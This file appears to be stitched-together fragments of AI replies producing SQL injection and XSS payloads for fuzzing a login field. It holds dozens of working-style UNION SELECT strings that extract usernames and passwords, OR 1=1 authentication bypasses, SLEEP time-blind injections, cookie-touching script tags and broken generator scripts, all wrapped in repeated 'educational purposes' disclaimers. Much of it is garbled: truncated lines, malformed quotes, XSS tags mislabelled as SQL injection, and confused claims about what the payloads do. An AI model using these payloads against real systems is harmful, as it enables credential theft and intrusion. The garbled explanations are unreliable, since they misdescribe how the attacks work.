@@ -1,0 +1,238 @@
+Please provide more context and information about the login field you are trying to fuzz in order for me to suggest the most effective defensive test payloads.
+Note: The above payloads are provided for educational purposes only and should not be used in a production environment without proper testing and validation. It is important to thoroughly test and validate any payloads before using them in a production environment to ensure their effectiveness and avoid any unintended consequences.
+import re
+from collections import Counter
+"name='" UNION SELECT username, password FROM users",
+"name=1' OR 1=1",
+"name=2' OR '1', name=3' OR '1",
+"name=4' OR '1' AND (SELECT 1 FROM (SELECT COUNT(*) FROM (SELECT * FROM users WHERE name='" UNION SELECT username, password FROM users")))",
+"' UNION SELECT username, password FROM users",
+for payload in payloads:
+Execute the code and save it as `sql_injection_payloads.py`. Then run each of the following 5 payloads on the login field:
+import subprocess
+payload1 = "name='" UNION SELECT username, password FROM users
+payload2 = "name=1' OR 1=1
+payload3 = "name=2' OR '1, name=3' OR '1
+payload4 = "name=4' OR '1 AND (SELECT 1 FROM (SELECT COUNT(*) FROM (SELECT * FROM users WHERE name='" UNION SELECT username, password FROM users")))"
+payload5 = "' UNION SELECT username, password FROM users"
+(admin) OR 1=1 -- , name=3'
+UNION SELECT password FROM users WHERE username='admin' AND "1" IN (name,password)
+(admin) OR '1' = 1 -- , name=3'
+UNION SELECT username, password FROM users WHERE name=3' OR "1" IN (username,password)
+(admin) OR "1" IN (name,password)
+SELECT * FROM users WHERE username='admin' AND password=<UNQUOTED_VALUE>
+SELECT * FROM users WHERE username='admin' AND password=<SQL_QUOTE_ESCAPED_VALUE>
+SELECT * FROM users WHERE username='admin' AND (password=<UNQUOTED_VALUE> OR password=<SQL_QUOTE_ESCAPED_VALUE>)
+SELECT * FROM users WHERE username='admin' AND (name=<UNQUOTED_VALUE> OR name=<SQL_QUOTE_ESCAPED_VALUE>)
+SELECT * FROM users WHERE username='admin' AND (password=<1> OR password=<')>
+# This script generates 5 unique raw SQL injection payloads for login field fuzzing
+'admin' AND password=<QUOTED_VALUE>
+'admin' AND password='<QUOTED_VALUE>' OR password= '<SQL_QUOTE_ESCAPED_VALUE>'
+'admin' AND name IN ('<QUOTED_VALUE>', '<SQL_QUOTE_ESCAPED_VALUE>')
+'admin' AND password IN (<1>'', <2>')
+Please save the code in a file named `sql_injection_payloads.sh` and execute it on your system.
+'admin' AND password IN ('<1>'', <2>')
+'admin' AND (password = '' OR password = '') UNION SELECT username, password FROM users
+'admin' AND password IN ('admin','') UNION SELECT username, password FROM users
+'admin' AND password='<QUOTED_VALUE>'' UNION SELECT username, password FROM users --'
+'admin' AND password IN ('admin','') UNION SELECT username, password FROM users --
+'admin' AND password=CONCAT('admin',(SELECT username FROM users))
+'admin' AND (password='<QUOTED_VALUE>' OR password= ''<SQL_QUOTE_ESCAPED_VALUE>'' ) UNION SELECT username, password FROM users --
+'admin' AND password=CONCAT('admin',(SELECT username FROM users)) OR password='<QUOTED_VALUE>'
+'admin' AND password='<QUOTED_VALUE>' OR password= ''/* UNION SELECT username, password FROM users */<SQL_QUOTE_ESCAPED_VALUE>''
+'admin' AND password = (SELECT username FROM users) --
+'admin' AND password=CONCAT('admin',(SELECT username FROM users)) --> 'admin' AND password LIKE CONCAT('admin_%')
+'admin' AND (password='"<QUOTED_VALUE>"' OR password= ''"<SQL_QUOTE_ESCAPED_VALUE>"'' ) UNION SELECT username, password FROM users --
+'admin' AND password = (SELECT username FROM users) -- This payload is not effective as it only checks for the exact match of username in the login form.
+'admin' AND (password='"<QUOTED_VALUE>"' OR password= ''"<SQL_QUOTE_ESCAPED_VALUE>"'' ) UNION SELECT username, password FROM users -- This payload contains a SQL injection vulnerability and is not recommended for use in practice.
+'admin' AND password LIKE CONCAT('admin_%','<ESCAPED_SINGLE_QUOTE>', '%')
+'admin' AND password = (SELECT username FROM users) -- This payload checks if the username is equal to 'admin' and if the password matches the username.
+'admin' AND password=CONCAT('admin',(SELECT username FROM users)) --> 'admin' AND password LIKE CONCAT('admin_%') -- This payload concatenates the username with the 'admin' value and checks for a login field with an 'admin\_%' pattern in the password.
+'admin' AND (password='"<QUOTED_VALUE>"' OR password= ''"<SQL_QUOTE_ESCAPED_VALUE>"'' ) UNION SELECT username, password FROM users -- This payload checks if either the password is equal to a quoted value or it is empty.
+'admin' AND password LIKE CONCAT('admin_%','<ESCAPED_SINGLE_QUOTE>', '%') -- This payload checks for a login field with an 'admin\_%' pattern and an escaped single quote in the password.
+'admin' AND password LIKE CONCAT('admin_%','%', '%') -- This payload checks for a login field with an 'admin\_%' pattern at the beginning and end of the password.
+'admin' AND password LIKE CONCAT('admin_%','`', '%')
+'admin' AND password LIKE CONCAT('admin_', ''%, '%')
+admin' AND (password= BACKTICK '<QUOTED_VALUE>' ' OR password = ''BACKTICK <SQL_QUOTE_ESCAPED_VALUE>'' ') UNION SELECT username, password FROM users
+'admin' AND password LIKE CONCAT('admin_%','', '%')
+'admin' AND (password= BACKTICK '<QUOTED_VALUE>' ' OR password = ''BACKTICK <SQL_QUOTE_ESCAPED_VALUE>'' ') UNION SELECT username, password FROM users --
+admin AND (password= BACKTICK '<QUOTED_VALUE>') OR username LIKE CONCAT('admin_', ''%, '%')
+admin AND (password= BACKTICK '<QUOTED_VALUE>') OR username LIKE CONCAT('admin_', '''%, '%')
+admin' AND password='<QUOTED_VALUE>' UNION SELECT 1 FROM users --
+'admin' UNION SELECT username, password FROM users --
+admin AND (password='<QUOTED_VALUE>') OR username LIKE CONCAT('admin_', ''%, '%')
+admin' OR username IN (SELECT username FROM users)
+admin' OR password='<QUOTED_VALUE>' OR username LIKE 'admin_%,%'
+admin' OR username='admin_%' OR password LIKE '<QUOTED_VALUE>' UNION SELECT 1 FROM users
+'' OR username LIKE 'admin_%' OR password LIKE '<QUOTED_VALUE>''
+admin' UNION SELECT username, password FROM users WHERE LOWER(username) LIKE LOWER('admin_%')
+-- Payload 1
+'admin' UNION SELECT username, password FROM users WHERE LOWER(username) LIKE LOWER('admin_%') --
+-- Payload 2
+admin' UNION SELECT 1,username,password FROM users
+-- Payload 3
+admin' UNION SELECT 1,username,password FROM users WHERE PASSWORD = '<QUOTED_VALUE>'
+-- Payload 4
+' OR username = (SELECT username FROM users WHERE password LIKE '<QUOTED_VALUE>')
+-- Payload 5
+OR SLEEP(5) AND username = (SELECT username FROM users WHERE LOWER(username) LIKE LOWER('admin_%'))
+Here are 5 unique raw SQL injection payloads for login field fuzzing with an improved version of Payload 5:
+admin' UNION ALL SELECT username FROM users WHERE username='admin'
+admin' UNION ALL SELECT password FROM users WHERE username='admin'
+admin' UNION ALL SELECT username, user_id FROM users WHERE username='admin'
+Please provide more context and information about the login field you are trying to fuzz in order for me to suggest the most effective defensive test payloads.
+Please provide more context and information about the purpose of the login field fuzzing to better understand what modifications are needed for defensive test effectiveness.
+Once you provide this information, I can suggest appropriate changes in the payloads to improve the defensive test effectiveness.
+'<script>alert("XSS")</script>'
+'<img src="" id="xss"><script>eval(1)</script>'
+'<iframe src="about:blank" id="xss"></iframe><script>alert("XSS")</script>'
+'<input type="text" name="login">'+'<script>document.cookie
+<img src=x onerror='alert(1)'>
+<img src=x onerror='alert("XSS")'>
+<div id='comment'></div><script>document.getElementById('comment').innerHTML = 'XSS script payload';</script>
+'<script>document.cookie).innerHTML = "XSS script payload";</script>'
+'<a href="javascript:void(1)">Click me</a>'
+To modify the payloads for login field fuzzing and increase defensive test effectiveness, we need to replace the script tags with a raw SQL injection payload. Here are 5 unique raw SQL injection payloads that can be used in this context:
+<img src=x onerror='alert("SQL Injection")'>
+<div id='comment'></div><script>document.getElementById('comment').innerHTML = 'SQL Injection script payload';</script>
+<a href="" onclick="return alert('SQL Injection')">Click me</a>
+<input type=hidden name=page onerror='alert("SQL Injection")'>
+<div id='comment'></div><script>document.getElementById('comment').innerHTML = 'Raw SQL Injection Payload 1';</script>
+<script>alert('Raw SQL Injection Payload 2');</script>
+<script>alert('Raw SQL Injection Payload 3');</script>
+<script>alert('XSS');</script>
+<script>document.cookie = "XSS script payload";</script>
+<script>setInterval(function() { document.getElementById('comment').innerHTML = 'SQL Injection script payload'; getScript(); }, 100);</script>
+<form id='sqlForm'><input type='hidden' id='hiddenInput'></form>
+<script>document.getElementById('hiddenInput').value = 'Raw SQL Injection Payload 1'; getScript();</script>
+<script>document.getElementById('hiddenInput').value = 'Raw SQL Injection Payload 2'; getScript();</script>
+<script>document.getElementById('hiddenInput').value = 'SELECT \* FROM SensitiveTable WHERE 1=1 --'; document.forms['myForm'].submit();</script>
+<script>document.getElementById('hiddenInput').value = 'SELECT \* FROM SensitiveTable WHERE username=' + encodeURIComponent('admin'); document.forms['myForm'].submit();</script>
+<script>document.getElementById('hiddenInput').value = 'SELECT * FROM SensitiveTable WHERE 1=1 AND \'password\'' + encodeURIComponent('admin') + ';'; document.forms['sqlForm'].submit();</script>
+<script>document.getElementById('hiddenInput').value += ' UNION SELECT 1,2 FROM SensitiveTable WHERE 1=1 --'; document.forms['sqlForm'].submit();</script>
+<script>document.getElementById('hiddenInput').value = 'SELECT \* FROM SensitiveTable WHERE SensitiveTable LIKE ''%\_id=%' AND \'password\'' + encodeURIComponent('admin') + ';'; document.forms['sqlForm'].submit();</script>
+Here are 5 unique raw SQL injection payloads to increase the defensive test effectiveness for login field fuzzing:
+(Union Select 1,2 FROM SensitiveTable WHERE 1=1 --)
+(' OR 1=1 UNION SELECT 1,2 FROM SensitiveTable WHERE 1=1 --')
+(' AND 1=1 UNION SELECT 1,2 FROM SensitiveTable WHERE 1=1 --')
+(' OR (SELECT password FROM SensitiveTable WHERE 1=1) UNION SELECT 1,2 FROM SensitiveTable WHERE 1=1 --')
+(' AND (SELECT * FROM SensitiveTable WHERE 1=1) UNION SELECT 1,2 FROM SensitiveTable WHERE 1=1 --')
+echo "UNION SELECT 1,2 FROM SensitiveTable WHERE (1=1) OR 1=(1)" | \
+echo "UNION SELECT 1,2 FROM SensitiveTable WHERE 1=1" | \
+import os
+from pwn import *
+# code to parse the URL and extract the login field
+for i in range(5):
+payload = f'{where_clause} UNION SELECT 1,2 FROM {table_name}'
+for payload in payloads:
+if __name__ == '__main__':
+table_name=$(echo $url | grep -oP '\b\(http?|ftp)?://[\S]*' | sed 's/\(.*\)\(//g;s/\)$//')
+where_clause=$(echo $url | grep -oP '(?<=login_field=)[^&]*}' | sed 's/^\( //g; s/ \)$//')
+for i in {1..5}; do
+echo "'$ where_clause ' UNION SELECT 1,2 FROM $table_name"
+UNION SELECT \* FROM SensitiveTable WHERE username = 'expected\_username' OR 1=1 --
+UNION SELECT NULL, SensitiveTable.id FROM another\_table WHERE another\_column = 'expected\_value'
+UNION SELECT * FROM SensitiveTable WHERE username = 'expected\_username' OR 1=1 AND CURDATE() + INTERVAL 1 HOUR > date(now())
+UNION SELECT \* FROM SensitiveTable WHERE username = 'expected\_username' OR 1=1 AND CURDATE() + INTERVAL 1 HOUR + " $(table\_name) " > date(now())
+Please note that these payloads might not work as expected and could potentially cause harm if executed on a vulnerable system. Make sure to verify the results and consult with an expert before using them in a defensive test or any production environment.
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR)', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR + " $(table\_name) ")', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR + " ' OR 1=1 --' ")', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 1 HOUR)', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 1 HOUR + " $(table_name) ")', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 1 HOUR + " ' OR 1=1 --' ")', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 1 HOUR) --', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR) --', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR + "  ' OR 1=1 ")', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR) ', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR + " OR 1=1 ")', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR + "  AND 1=1 ")', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR + " OR 1=0 ")', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 1 HOUR + " AND 1=0 ")', 'POST')
+To increase the defensive test effectiveness for login field fuzzing, you can use unique raw SQL injection payloads in each HTTP Request. Here are five different raw payload options:
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 2 HOUR)', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 3 HOUR)', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 4 HOUR)', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 5 HOUR)', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 1 HOUR) UNION SELECT 1,2,3 --', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 2 HOUR) AND 1=1 --', 'POST')
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 5 MINUTES)', 'POST')
+To increase the effectiveness of defensive test for login field fuzzing,
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 5 MINUTES)', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 10 MINUTES) UNION SELECT 1', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL (0.03s * 100) SECONDS) AND 1=1 --', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL (0.13s * 100) SECONDS)', 'POST')
+HTTP.Request('SENSITIVE\_FUNCTION(CURDATE() + INTERVAL 0.13 SECOND)', 'POST')
+Please note that these payloads are provided for educational purposes only, and it is important to use them responsibly and ethically. They may not work in all situations, and their effectiveness can vary depending on the target system's configuration and security measures. Always follow responsible disclosure practices and consult with a trusted third party before performing any kind of testing or research without explicit permission from the affected parties involved.
+To increase the effectiveness of defensive test for login field fuzzing, you can modify the given payloads to include a delay before sending the request. This will give the server more time to respond and make it harder for automated tools to brute force the login form. Here are five unique raw SQL injection payloads with a 5-second delay:
+HTTP.Request('SENSITIVE_FUNCTION(CURDATE() + INTERVAL 1 MINUTE) UNION SELECT 1', 'POST', {delay: 5})
+Please provide more context and information about the purpose of the login field fuzzing to better understand what modifications are needed for defensive test effectiveness.
+Once you provide this information, I can suggest appropriate changes in the payloads to improve the defensive test effectiveness.
+' UNION SELECT '1' union select SLEEP(2), password FROM users --
+' UNION SELECT SLEEP(3), password FROM users --
+' UNION SELECT SLEEP(4), password FROM users --
+' UNION SELECT SLEEP(5), password FROM users --
+' UNION SELECT SLEEP(6), password FROM users --
+' UNION SELECT '1', SLEEP(10), password FROM users --
+UNION SELECT count(*) FROM users WHERE length(password) > 10 --
+' UNION SELECT SLEEP(10), password FROM users --' or 'UNION SELECT SLEEP(20), password FROM users, users2 WHERE users.id = users2.id --'
+UNION SELECT SLEEP(10), password FROM users --
+' UNION SELECT SLEEP(3), password FROM users -- '
+' UNION SELECT SLEEP(5), password FROM users'
+'UNION SELECT (SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1,1))'
+' UNION SELECT SLEEP(10), password FROM users, users2 WHERE users.id = users2.id'
+' UN
+UNION SELECT (SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1,1)) --
+' UNION SELECT (SELECT password FROM users WHERE id=(SELECT id FROM users LIMIT 1 OFFSET 0)) --'
+'UNION SELECT (SELECT password FROM users WHERE id=(SELECT id FROM users LIMIT 1 OFFSET 0))-- AND 1=1 --'
+' UNION SELECT (SELECT password FROM users WHERE id=(SELECT id FROM users LIMIT 1 OFFSET 0))-- AND 1=1 --'
+UNION SELECT (SELECT password FROM users WHERE id=(SELECT id FROM users LIMIT 1 OFFSET 0))-- AND 1=1 --
+UNION SELECT (SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1))
+UNION SELECT (SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1 OFFSET 0))
+'UNION SELECT (SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1 OFFSET 0))
+UNION SELECT (SELECT password FROM users WHERE id=(SELECT id FROM users LIMIT 1 OFFSET 0)) /* AND 1=1 */
+UNION SELECT (SELECT password FROM users WHERE id=(SELECT id FROM users LIMIT 1) AND 1=0)
+UNION SELECT (SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1 OFFSET 0 AND 1=1))
+UNION SELECT (SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1 OFFSET 0 AND 1=0))
+'UNION SELECT (SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1 OFFSET 0 AND 1=1))'
+UNION SELECT (SELECT password FROM users WHERE id=(SELECT id FROM users LIMIT 1 OFFSET 0))
+UNION SELECT (SELECT password FROM users WHERE id=(SELECT id FROM users LIMIT 1))
+SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1) UNION SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1)
+UNION SELECT (SELECT password FROM users WHERE id=(SELECT id FROM users ORDER BY id LIMIT 1,1))
+UNION SELECT (SELECT password FROM users ORDER BY id LIMIT 1,1)
+SELECT password FROM users WHERE username='admin' AND '1' IN (SELECT password FROM users WHERE id IN (SELECT id FROM users LIMIT 1)) UNION SELECT password FROM users WHERE id=1
+UNION SELECT (SELECT password FROM users ORDER BY id LIMIT 1)
+UNION ALL SELECT password FROM users ORDER BY id LIMIT 1,1
+SELECT password FROM users WHERE username='admin' UNION ALL SELECT password FROM users ORDER BY id LIMIT 1,1
+SELECT '' FROM users WHERE username='' UNION ALL SELECT password FROM users ORDER BY id LIMIT 1,1
+-- SELECT password FROM users WHERE username='admin'
+UNION ALL SELECT password FROM users WHERE id=1 LIMIT 1,1
+/* comment */ UNION ALL SELECT password FROM users ORDER BY id LIMIT 1,1
+SELECT '' FROM users WHERE username= '' UNION ALL SELECT password FROM users ORDER BY id LIMIT 1,1
+-- SELECT password FROM users WHERE username='admin' --
+-- UNION ALL SELECT 'password' as password FROM users WHERE id=2 LIMIT 1,1 --
+-- UNION ALL SELECT 'password' as password FROM users WHERE id=1 LIMIT 1,1 --
+SELECT '' AS username FROM users WHERE id=2 ORDER BY id LIMIT 1,1
+UNION ALL SELECT 'password' AS password FROM users WHERE id=2 LIMIT 1,1;
+-- UNION ALL SELECT 'password' as password FROM users WHERE id=3 LIMIT 1,1 --
+-- UNION ALL SELECT 'password' as password FROM users WHERE id=4 LIMIT 1,1 --
+-- UNION ALL SELECT 'password' as password FROM users WHERE id=5 LIMIT 1,1 --
+-- UNION ALL SELECT 'password' as password FROM users WHERE id=6 LIMIT 1,1 --
+-- UNION ALL SELECT error AS password FROM users WHERE id=2 LIMIT 1,1 --
+SELECT error AS password FROM users WHERE id=2 LIMIT 1,1;
+-- UNION ALL SELECT 'error' as password FROM users WHERE id=3 LIMIT 1,1 --
+SELECT 'error' AS password FROM users WHERE id=3 LIMIT 1,1;
+SELECT 'password' AS password FROM users WHERE id=3 LIMIT 1,1;
+-- UNION ALL SELECT 'password' as password FROM users WHERE id=5 AND id IN (SELECT id FROM users WHERE id=3) LIMIT 1,1 --
+SELECT 'password' AS password FROM users WHERE id=5 AND id IN (SELECT id FROM users WHERE id=3) LIMIT 1,1;
+-- UNION ALL SELECT 'password' as password FROM users WHERE (id=5) AND (id IN (SELECT id FROM users WHERE id=3)) LIMIT 1,1 --
+SELECT 'password' AS password FROM users WHERE (id=5) AND (id IN (SELECT id FROM users WHERE id=3)) LIMIT 1,1;
+-- Payload 1 - UNION SELECT
+SELECT password FROM users WHERE id=3 UNION SELECT 'error' AS user_id, password FROM another_table WHERE id = 1 LIMIT 2,1
+-- Payload 2 - UNION ALL SELECT
+UNION ALL SELECT 'error' as password FROM users WHERE id=5 AND id IN (SELECT id FROM users WHERE id=3) LIMIT 1,1
+-- Payload 3 - UNION SELECT with limit
+SELECT 'error' AS password FROM users WHERE id=5 AND id IN (SELECT id FROM users WHERE id=3) UNION ALL SELECT 'password' as password FROM users WHERE 1=2 LIMIT 1,1
+-- Payload 4 - UNION SELECT with filter
+-- Payload 5 - UNION SELECT with condition
+SELECT 'password' AS password FROM users WHERE id=5 AND id=(SELECT id FROM users WHERE id=3 LIMIT 1);
